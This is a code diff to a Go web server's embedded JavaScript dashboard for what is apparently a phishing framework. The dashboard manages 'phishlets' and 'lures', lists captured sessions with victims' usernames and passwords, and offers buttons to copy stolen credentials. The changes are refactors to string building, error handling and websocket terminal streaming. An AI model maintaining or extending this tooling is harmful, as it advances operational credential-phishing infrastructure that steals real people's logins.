@@ -1002,7 +1002,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
             showStep(step) {
                 document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-                document.querySelector(`[data-step="${step}"]`).classList.add('active');
+                document.querySelector('[data-step="' + step + '"]').classList.add('active');
             }
 
             copyKey() {
@@ -1084,7 +1084,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
             connectWebSocket() {
                 const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-                const wsUrl = ` + "`" + `${protocol}//${window.location.host}/ws` + "`" + `;
+                const wsUrl = protocol + '//' + window.location.host + '/ws';
                 
                 this.ws = new WebSocket(wsUrl);
                 
@@ -1181,45 +1181,44 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     return;
                 }
 
-                const tableHTML = ` + "`" + `
-                    <table class="sessions-table">
-                        <thead>
-                            <tr>
-                                <th>ID</th>
-                                <th>Phishlet</th>
-                                <th>Username</th>
-                                <th>Password</th>
-                                <th>Status</th>
-                                <th>IP Address</th>
-                                <th>Time</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            ${sessions.map(session => ` + "`" + `
-                                <tr>
-                                    <td>${session.id}</td>
-                                    <td><strong>${session.phishlet}</strong></td>
-                                    <td>${session.username || '-'}</td>
-                                    <td>${session.password ? '••••••••' : '-'}</td>
-                                    <td>
-                                        <span class="status-badge ${this.getSessionStatus(session)}">
-                                            ${this.getSessionStatusText(session)}
-                                        </span>
-                                    </td>
-                                    <td>${session.remote_addr}</td>
-                                    <td>${new Date(session.update_time * 1000).toLocaleString()}</td>
-                                    <td>
-                                        ${session.username && session.password ? 
-                                            `<button class="btn btn-secondary" onclick="copySessionCredentials('${session.username}', '${session.password}')">📋 Copy</button>` : 
-                                            '-'
-                                        }
-                                    </td>
-                                </tr>
-                            ` + "`" + `).join('')}
-                        </tbody>
-                    </table>
-                ` + "`" + `;
+                let tableHTML = '<table class="sessions-table">' +
+                    '<thead>' +
+                        '<tr>' +
+                            '<th>ID</th>' +
+                            '<th>Phishlet</th>' +
+                            '<th>Username</th>' +
+                            '<th>Password</th>' +
+                            '<th>Status</th>' +
+                            '<th>IP Address</th>' +
+                            '<th>Time</th>' +
+                            '<th>Actions</th>' +
+                        '</tr>' +
+                    '</thead>' +
+                    '<tbody>';
+
+                sessions.forEach(session => {
+                    tableHTML += '<tr>' +
+                        '<td>' + session.id + '</td>' +
+                        '<td><strong>' + session.phishlet + '</strong></td>' +
+                        '<td>' + (session.username || '-') + '</td>' +
+                        '<td>' + (session.password ? '••••••••' : '-') + '</td>' +
+                        '<td>' +
+                            '<span class="status-badge ' + this.getSessionStatus(session) + '">' +
+                                this.getSessionStatusText(session) +
+                            '</span>' +
+                        '</td>' +
+                        '<td>' + session.remote_addr + '</td>' +
+                        '<td>' + new Date(session.update_time * 1000).toLocaleString() + '</td>' +
+                        '<td>' +
+                            (session.username && session.password ? 
+                                '<button class="btn btn-secondary" onclick="copySessionCredentials(\'' + session.username + '\', \'' + session.password + '\')">Copy</button>' : 
+                                '-'
+                            ) +
+                        '</td>' +
+                    '</tr>';
+                });
+
+                tableHTML += '</tbody></table>';
 
                 contentEl.innerHTML = tableHTML;
             }
@@ -1232,37 +1231,37 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     return;
                 }
 
-                const phishletsHTML = ` + "`" + `
-                    <div class="phishlets-grid">
-                        ${phishlets.map(phishlet => ` + "`" + `
-                            <div class="phishlet-card">
-                                <div class="phishlet-name">${phishlet.name}</div>
-                                <div class="phishlet-status">
-                                    <span>Status:</span>
-                                    <span class="status-badge ${phishlet.enabled ? 'status-captured' : 'status-empty'}">
-                                        ${phishlet.enabled ? 'Enabled' : 'Disabled'}
-                                    </span>
-                                </div>
-                                <div class="phishlet-status">
-                                    <span>Hostname:</span>
-                                    <span>${phishlet.hostname || 'Not set'}</span>
-                                </div>
-                                <div class="phishlet-status">
-                                    <span>Visible:</span>
-                                    <span>${phishlet.visible ? 'Yes' : 'No'}</span>
-                                </div>
-                                <div class="phishlet-actions">
-                                    <button class="btn ${phishlet.enabled ? 'btn-secondary' : 'btn-primary'}" 
-                                            onclick="togglePhishlet('${phishlet.name}', ${phishlet.enabled})">
-                                        ${phishlet.enabled ? '🔴 Disable' : '🟢 Enable'}
-                                    </button>
-                                    <button class="btn btn-secondary" onclick="copyCredentials('${phishlet.name}')">📋 Copy</button>
-                                    <button class="btn btn-secondary" onclick="setPhishletHostname('${phishlet.name}')">🏠 Set Hostname</button>
-                                </div>
-                            </div>
-                        ` + "`" + `).join('')}
-                    </div>
-                ` + "`" + `;
+                let phishletsHTML = '<div class="phishlets-grid">';
+                
+                phishlets.forEach(phishlet => {
+                    phishletsHTML += '<div class="phishlet-card">' +
+                        '<div class="phishlet-name">' + phishlet.name + '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Status:</span>' +
+                            '<span class="status-badge ' + (phishlet.enabled ? 'status-captured' : 'status-empty') + '">' +
+                                (phishlet.enabled ? 'Enabled' : 'Disabled') +
+                            '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Hostname:</span>' +
+                            '<span>' + (phishlet.hostname || 'Not set') + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Visible:</span>' +
+                            '<span>' + (phishlet.visible ? 'Yes' : 'No') + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-actions">' +
+                            '<button class="btn ' + (phishlet.enabled ? 'btn-secondary' : 'btn-primary') + '" ' +
+                                    'onclick="togglePhishlet(\'' + phishlet.name + '\', ' + phishlet.enabled + ')">' +
+                                (phishlet.enabled ? '🔴 Disable' : '🟢 Enable') +
+                            '</button>' +
+                            '<button class="btn btn-secondary" onclick="copyCredentials(\'' + phishlet.name + '\')">📋 Copy</button>' +
+                            '<button class="btn btn-secondary" onclick="setPhishletHostname(\'' + phishlet.name + '\')">🏠 Set Hostname</button>' +
+                        '</div>' +
+                    '</div>';
+                });
+                
+                phishletsHTML += '</div>';
 
                 contentEl.innerHTML = phishletsHTML;
             }
@@ -1275,36 +1274,36 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     return;
                 }
 
-                const luresHTML = ` + "`" + `
-                    <div class="phishlets-grid">
-                        ${lures.map((lure, index) => ` + "`" + `
-                            <div class="phishlet-card">
-                                <div class="phishlet-name">Lure #${index}</div>
-                                <div class="phishlet-status">
-                                    <span>Phishlet:</span>
-                                    <span>${lure.phishlet}</span>
-                                </div>
-                                <div class="phishlet-status">
-                                    <span>Path:</span>
-                                    <span>${lure.path}</span>
-                                </div>
-                                <div class="phishlet-status">
-                                    <span>Hostname:</span>
-                                    <span>${lure.hostname || 'Default'}</span>
-                                </div>
-                                <div class="phishlet-status">
-                                    <span>Redirect URL:</span>
-                                    <span>${lure.redirect_url || 'None'}</span>
-                                </div>
-                                <div class="phishlet-actions">
-                                    <button class="btn btn-primary" onclick="getLureURL(${index})">🔗 Get URL</button>
-                                    <button class="btn btn-secondary" onclick="editLure(${index})">✏️ Edit</button>
-                                    <button class="btn btn-secondary" onclick="deleteLure(${index})">🗑️ Delete</button>
-                                </div>
-                            </div>
-                        ` + "`" + `).join('')}
-                    </div>
-                ` + "`" + `;
+                let luresHTML = '<div class="phishlets-grid">';
+                
+                lures.forEach((lure, index) => {
+                    luresHTML += '<div class="phishlet-card">' +
+                        '<div class="phishlet-name">Lure #' + index + '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Phishlet:</span>' +
+                            '<span>' + lure.phishlet + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Path:</span>' +
+                            '<span>' + lure.path + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Hostname:</span>' +
+                            '<span>' + (lure.hostname || 'Default') + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Redirect URL:</span>' +
+                            '<span>' + (lure.redirect_url || 'None') + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-actions">' +
+                            '<button class="btn btn-primary" onclick="getLureURL(' + index + ')">🔗 Get URL</button>' +
+                            '<button class="btn btn-secondary" onclick="editLure(' + index + ')">✏️ Edit</button>' +
+                            '<button class="btn btn-secondary" onclick="deleteLure(' + index + ')">🗑️ Delete</button>' +
+                        '</div>' +
+                    '</div>';
+                });
+                
+                luresHTML += '</div>';
 
                 contentEl.innerHTML = luresHTML;
             }
@@ -1335,7 +1334,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
             async copyCredentials(phishletName) {
                 try {
-                    const response = await fetch(`/api/phishlets/${phishletName}/credentials`, {
+                    const response = await fetch('/api/phishlets/' + phishletName + '/credentials', {
                         headers: { 'Authorization': authManager.token }
                     });
                     const data = await response.json();
@@ -1358,13 +1357,13 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             async togglePhishlet(phishletName, isEnabled) {
                 try {
                     const endpoint = isEnabled ? 'disable' : 'enable';
-                    const response = await fetch(`/api/phishlets/${phishletName}/${endpoint}`, {
+                    const response = await fetch('/api/phishlets/' + phishletName + '/' + endpoint, {
                         method: 'POST',
                         headers: { 'Authorization': authManager.token }
                     });
                     const data = await response.json();
                     if (data.success) {
-                        alert(`Phishlet ${phishletName} ${isEnabled ? 'disabled' : 'enabled'} successfully!`);
+                        alert('Phishlet ' + phishletName + ' ' + (isEnabled ? 'disabled' : 'enabled') + ' successfully!');
                         this.loadInitialData(); // Refresh the phishlets list
                     } else {
                         alert('Failed to update phishlet: ' + data.message);
@@ -1376,11 +1375,11 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
 
             async setPhishletHostname(phishletName) {
-                const hostname = prompt(`Set hostname for ${phishletName}:`, '');
+                const hostname = prompt('Set hostname for ' + phishletName + ':', '');
                 if (hostname === null) return; // User cancelled
                 
                 try {
-                    const response = await fetch(`/api/phishlets/${phishletName}/hostname`, {
+                    const response = await fetch('/api/phishlets/' + phishletName + '/hostname', {
                         method: 'POST',
                         headers: { 
                             'Authorization': authManager.token,
@@ -1390,7 +1389,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     });
                     const data = await response.json();
                     if (data.success) {
-                        alert(`Hostname set for ${phishletName}!`);
+                        alert('Hostname set for ' + phishletName + '!');
                         this.loadInitialData(); // Refresh the phishlets list
                     } else {
                         alert('Failed to set hostname: ' + data.message);
@@ -1423,7 +1422,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
         // Global function for copying session credentials
         function copySessionCredentials(username, password) {
-            const credentials = `Username: ${username}\nPassword: ${password}`;
+            const credentials = 'Username: ' + username + '\nPassword: ' + password;
             navigator.clipboard.writeText(credentials).then(() => {
                 alert('Session credentials copied to clipboard!');
             }).catch(err => {
@@ -1464,7 +1463,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
         async function getLureURL(lureId) {
             try {
-                const response = await fetch(`/api/lures/${lureId}/url`, {
+                const response = await fetch('/api/lures/' + lureId + '/url', {
                     headers: { 'Authorization': authManager.token }
                 });
                 const data = await response.json();
@@ -1488,8 +1487,8 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             const redirectUrl = prompt('Enter redirect URL (leave empty for none):');
             
             try {
-                const response = await fetch(`/api/lures/${lureId}`, {
-                    method: 'PUT',
+                            const response = await fetch('/api/lures/' + lureId, {
+                method: 'PUT',
                     headers: { 
                         'Authorization': authManager.token,
                         'Content-Type': 'application/json'
@@ -1515,8 +1514,8 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         async function deleteLure(lureId) {
             if (confirm('Are you sure you want to delete this lure?')) {
                 try {
-                    const response = await fetch(`/api/lures/${lureId}`, {
-                        method: 'DELETE',
+                                    const response = await fetch('/api/lures/' + lureId, {
+                    method: 'DELETE',
                         headers: { 'Authorization': authManager.token }
                     });
                     if (response.ok) {
@@ -1823,10 +1822,10 @@ func (ws *WebServer) handleAPIPhishletEnable(w http.ResponseWriter, r *http.Requ
 		return
 	}
 
-	if ok := ws.cfg.SetSiteEnabled(name); !ok {
+	if err := ws.cfg.SetSiteEnabled(name); err != nil {
 		response := AuthResponse{
 			Success: false,
-			Message: "Failed to enable phishlet",
+			Message: "Failed to enable phishlet: " + err.Error(),
 		}
 		json.NewEncoder(w).Encode(response)
 		return
@@ -1854,10 +1853,10 @@ func (ws *WebServer) handleAPIPhishletDisable(w http.ResponseWriter, r *http.Req
 		return
 	}
 
-	if ok := ws.cfg.SetSiteDisabled(name); !ok {
+	if err := ws.cfg.SetSiteDisabled(name); err != nil {
 		response := AuthResponse{
 			Success: false,
-			Message: "Failed to disable phishlet",
+			Message: "Failed to disable phishlet: " + err.Error(),
 		}
 		json.NewEncoder(w).Encode(response)
 		return
@@ -2633,11 +2632,43 @@ func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*Termin
 	
 	// Handle stdout and stderr
 	go func() {
-		io.Copy(session.Conn, stdout)
+		buf := make([]byte, 1024)
+		for {
+			n, err := stdout.Read(buf)
+			if err != nil {
+				if err != io.EOF {
+					log.Error("Error reading stdout: %v", err)
+				}
+				break
+			}
+			if n > 0 {
+				err = session.Conn.WriteMessage(websocket.TextMessage, buf[:n])
+				if err != nil {
+					log.Error("Error writing to websocket: %v", err)
+					break
+				}
+			}
+		}
 	}()
 	
 	go func() {
-		io.Copy(session.Conn, stderr)
+		buf := make([]byte, 1024)
+		for {
+			n, err := stderr.Read(buf)
+			if err != nil {
+				if err != io.EOF {
+					log.Error("Error reading stderr: %v", err)
+				}
+				break
+			}
+			if n > 0 {
+				err = session.Conn.WriteMessage(websocket.TextMessage, buf[:n])
+				if err != nil {
+					log.Error("Error writing to websocket: %v", err)
+					break
+				}
+			}
+		}
 	}()
 	
 	return session, nil
